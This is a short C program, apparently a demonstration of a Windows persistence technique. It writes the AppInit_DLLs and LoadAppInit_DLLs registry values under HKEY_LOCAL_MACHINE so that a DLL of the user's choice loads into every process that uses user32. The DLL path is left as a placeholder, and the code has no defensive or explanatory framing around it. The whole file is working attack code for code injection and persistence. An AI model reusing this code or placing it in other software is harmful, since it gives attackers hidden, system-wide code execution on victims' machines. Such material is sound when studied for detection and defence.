
// appinit hooking technique : https://learn.microsoft.com/en-us/windows/win32/win7appqual/appinit-dlls-in-windows-7-and-windows-server-2008-r2

#include <windows.h>
#include <stdio.h>
#pragma comment(lib, "advapi32.lib")

int main(){

	HKEY hKey;
	DWORD val = 0x1;
	char dllName[] = "..."; //put dll here
	char keyName1[] = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows";
	char keyName2[] = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows";
	
	if (!RegCreateKeyExA( HKEY_LOCAL_MACHINE, keyName1, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL))
		printf("Opened appinit key, now modifying value..\n");
	
	if (!RegSetValueExA( hKey, "AppInit_DLLs", NULL, REG_SZ, (BYTE *)dllName, strlen(dllName)))
		printf("Reg value succesfully set\n");

	if (!RegCreateKeyExA( HKEY_LOCAL_MACHINE, keyName2, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL))
		printf("Opened loadappinit key, now modifying value..\n");
	
	if (!RegSetValueExA( hKey, "LoadAppInit_DLLs", NULL, REG_DWORD, (BYTE *)&val, sizeof(val)))
		printf("Reg value succesfully set\n");

	return 0;
}
